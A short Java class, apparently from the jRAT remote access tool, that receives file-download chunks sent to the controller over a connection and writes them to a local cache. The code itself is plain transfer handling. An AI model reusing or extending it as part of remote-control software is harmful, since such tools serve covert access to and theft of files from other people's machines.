package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.io.FileCache;
import jrat.common.io.TransferData;

public class Packet104ClientDownloadPart extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String remotePath = con.readLine();

		TransferData localData = FileCache.get(remotePath);
		
		byte[] buffer = new byte[con.readInt()];
		con.getDataInputStream().readFully(buffer);

		localData.getOutputStream().write(buffer);
		localData.increaseRead(buffer.length);
	}

}
